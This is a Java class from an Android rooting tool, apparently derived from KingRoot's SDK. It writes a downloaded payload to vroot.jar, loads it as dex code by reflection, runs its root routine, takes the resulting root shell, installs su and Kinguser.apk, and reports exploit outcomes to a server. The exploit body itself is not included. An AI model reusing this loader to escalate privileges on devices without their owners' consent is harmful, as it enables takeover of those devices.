package com.root;

/**
 * Created by Administrator on 2016/11/5.
 */

import android.content.Context;
import android.os.Handler;

import com.demo.entity.Entity;
import com.demo.process.RootProcess;
import com.demo.utils.Const;
import com.demo.utils.LogUtil;
import com.demo.utils.SpfUtils;
import com.kingroot.sdk.root.CommonLog;
import com.root.helper.AbsJavaProcessImpla;
import com.root.helper.JavaProcessImplh_absA;
import com.root.helper.JavaProcessk;
import com.root.helper.ThreadLocalWeakRef;
import com.root.util.RootUtils3;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import http.demo.SolutionHelpers;

/**
 * 这里主要是执行root，把kingroot下载好的文件执行
 * 这里会去加载一个存入的dex文件，
 */
public class JavaRoot extends FooRoot {

    private static Class clzz;
    private static Object obj;
    private int ret;

    private RootHelper rootHelper;

    public JavaRoot(Context context, Entity arg, SolutionHelpers solutionHelpers , Handler handler/*String sid*/) {
        super(context, arg,solutionHelpers ,handler);
        rootHelper = new RootHelper();
        ret = 1;
        LogUtil.e("javaroot 1 construct ");
    }
    //测试loadClass XSolution
    @Override
    public boolean beforeRoot() {
        super.beforeRoot();
        boolean flag = false;
        ClassLoader classLoader = null;
        String vroot = String.valueOf(play) + "/vroot.jar";//vroot.jar
        RootProcess rootProcess = new RootProcess("sh");
        rootProcess.execut(Const.EXPORT_PATH);
        rootProcess.execut("cat " + solutionHelpers.n + " > " + vroot);
        //load classes.dex文件
        rootProcess.closeAll();//关闭进程
        ThreadLocalWeakRef.createThreadLocal();
        if (loadClass()) {
            LogUtil.d("可以调用反射方法，使用动态加载的classes.dex的方法");
            try {
                classLoader = clzz.getClassLoader();
                Method init = clzz.getMethod(rootHelper.init2, rootHelper.o);
                HashMap map = new HashMap();
                map.put("workDir", play);
                map.put("safeMode", Boolean.valueOf(entity.c));
                init.invoke(obj, mContext, classLoader, map);//调用init2，反射的方式调用
            } catch (Throwable v) {
                try {
                    if (classLoader != null) {
                        clzz.getMethod(rootHelper.init, rootHelper.c).invoke(obj, mContext, play, classLoader);
                    }
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                    LogUtil.exception("invoke method execption ", e);
                    return flag;
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                    LogUtil.exception("invoke method execption ", e);
                    return flag;
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                    LogUtil.exception("invoke method execption ", e);
                    return flag;
                }
                LogUtil.exception("Javaroot1 beforeRoot exception,classLoader execption", v);
            }
            flag = true;
        }
        LogUtil.e("before init finished flag =" + flag);
        return flag;
    }

    private boolean loadClass() {
        LogUtil.d("loadClass ");
        boolean flag = false;
        try {
            if (clzz == null) {
            Class<?> c = DexUtils.loadClass(String.valueOf(play) + "/vroot.jar", play, rootHelper.a, mContext.getClassLoader());
            if (c != null)
            {
                clzz = c;
            } else {
                LogUtil.loge("或classLoader为空");
                return flag;
            }
        }
        if (obj == null) {
                obj = clzz.newInstance();
                LogUtil.d("实例化方案类是,获取到代理对象：" + obj);
                flag = true;
            }
            } catch (InstantiationException e) {
                e.printStackTrace();
                LogUtil.exception("实例化类异常 ", e);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
                LogUtil.exception("实例化类异常 ", e);
        }
        return flag;
    }
    @Override
    public void c() {
        LogUtil.e("JavaRootSolution1.destroy()");
        try {
            clzz.getMethod(rootHelper.destroy, rootHelper.g).invoke(obj, mContext);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
            LogUtil.exception("调用方案类destroy()方法异常!", e);
        }
    }
    public int a(RootLog arg) {
        int v0 = 0;
        int v13 = 5;
        int v5 = 3;
        int v4 = 2;
        ThreadLocalWeakRef.createThreadLocal();
        LogUtil.e("Javaroot onRooting  invoke classes.dex to do this");
        if (!loadClass()) {
            v0 = 1;
            LogUtil.e("没有load classes.dex文件。出现了错误。请调试代码!");
            return v0;
        }
        long v9 = System.nanoTime();
        Context context = mContext;
        String[] str_arr = new String[6];
        str_arr[0] = this.solutionHelpers.b;
        str_arr[1] = "154";
        str_arr[v4] = "";
        str_arr[v5] = new StringBuilder(String.valueOf(RootMgr.msg)).toString();
        str_arr[4] = "0";
        str_arr[v13] = "1";
        SpfUtils.a(context, "EMID_KRSDK_EXReport_Info", str_arr);
        try {
            LogUtil.e("onRoot() start sid = " + this.solutionHelpers.b);
            this.ret = ((Integer) clzz.getMethod(this.rootHelper.root, this.rootHelper.e).invoke(this.obj, this.mContext)).intValue();
            CommonLog log = new CommonLog(context);
            String v1 = "CATCH_SOLUTION_RESULT";
            int v2_1 = this.ret == 0 ? 0 : 1;
            log.recordExecutInfo(v1, v2_1, new StringBuilder(String.valueOf(this.ret)).toString(), "", this.handler, new Object[]{this.solutionHelpers.b});
            SpfUtils.markExploitRet(this.mContext, this.ret, new StringBuilder(String.valueOf(this.ret)).toString());
            String[] v11 = SpfUtils.e(this.mContext, "EMID_KRSDK_EXReport_Info");
            SpfUtils.removeMarsRootSharedPreferences(this.mContext, "EMID_KRSDK_EXReport_Info");
            v9 = (System.nanoTime() - v9) / 1000000;
            if (v11.length >= v13) {
                log = new CommonLog(context);
                int v1_1 = 200039;
                v2_1 = this.ret == 0 ? 0 : 1;
                log.recordEMID(v1_1, v2_1, "0", "result=" + this.ret, this.handler, new Object[]{v11[0], v11[1], v11[2], v11[3], Long.valueOf(v9), Integer.valueOf(1)});
                LogUtil.e("upload server ***********");
            }
            LogUtil.e("onRoot() end sid = " + this.solutionHelpers.b + ", result = " + this.ret + ", childDuingTime = " + v9);
            if (ret == 0) {
                LogUtil.e("初始化成功 ！！ 准备获取javaCracker对象");
                AbsJavaProcessImpla cracker = getCracker();
                if (cracker != null) {
                    LogUtil.e("获取到了 cracker ,继续执行");
                    LogUtil.e("Vroot.startSuc.ret = ");
                    boolean kd_is_link = JavaProcessk.a(entity.a(new String[]{"kd"}), cracker);
                    LogUtil.e("Vroot.startSuc.ret = "+kd_is_link);
                    if (f)
                    {
                        LogUtil.e("Vroot.installKu.ret = " + RootUtils3.a(this.mContext, cracker, this.entity.a(new String[]{"play", "su"}), this.entity.a(new String[]{"play", "Kinguser.apk"})));
                    }
                }
            } else {
                ret = 1;
                LogUtil.e("root init failed  ////////");
            }
            if (ret == 0) {
                LogUtil.e("on root() success ,congraduations  ,OMG, OMG ,OMG ");
            } else {
                LogUtil.e("on root() Dame it ,Oh God failed");
            }
            v0 = ret;
        } catch (Throwable v) {
            ThreadLocalWeakRef.a(7011, "jsolution onRoot exception", v);
            LogUtil.e("onRoot() exception : " + ThreadLocalWeakRef.b());
            v0 = 1;
        }
        return v0;
    }

    private AbsJavaProcessImpla getCracker() {
        AbsJavaProcessImpla obj = null;
        JavaProcessImplh_absA arg ;
        ThreadLocalWeakRef.createThreadLocal();
        LogUtil.e("JavaRootSolution.getSolutionShell()");
        if (ret == 0) {
            if (!loadClass()) {
                return obj;
            }
            try {
                arg = new JavaProcessImplh_absA(clzz, obj, clzz.getMethod(this.rootHelper.getShell, this.rootHelper.i).invoke(this.obj), this.rootHelper);
                obj = arg;
            } catch (Throwable v1) {
                LogUtil.exception("调用JavaShell的getShell()方法异常!", v1);
                ThreadLocalWeakRef.a(7014, "jsolution getShell exception", v1);
            }
        } else {
            LogUtil.e("jsolution getShell unroot");
            return obj;
        }
        return obj;
    }
}
